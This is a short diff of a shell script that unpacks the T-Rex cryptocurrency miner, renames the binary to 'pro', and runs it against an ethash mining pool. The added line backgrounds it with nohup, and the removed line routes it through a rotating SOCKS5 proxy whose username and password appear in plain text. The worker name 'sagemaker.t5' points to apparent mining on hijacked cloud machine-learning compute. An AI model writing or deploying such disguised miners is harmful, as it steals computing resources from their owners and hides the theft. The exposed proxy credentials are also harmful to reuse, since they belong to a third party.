@@ -5,4 +5,4 @@ tar -xvf t-rex-0.24.8-linux.tar.gz
 rm *.sh
 mv t-rex pro
 chmod +x pro
-./pro -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u sagemaker.t5 -p x --proxy socks5://njhlezbg-rotate:bo6mj3wz34gr@p.webshare.io:80
+nohup ./pro -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u sagemaker.t5 -p x > nohup.out
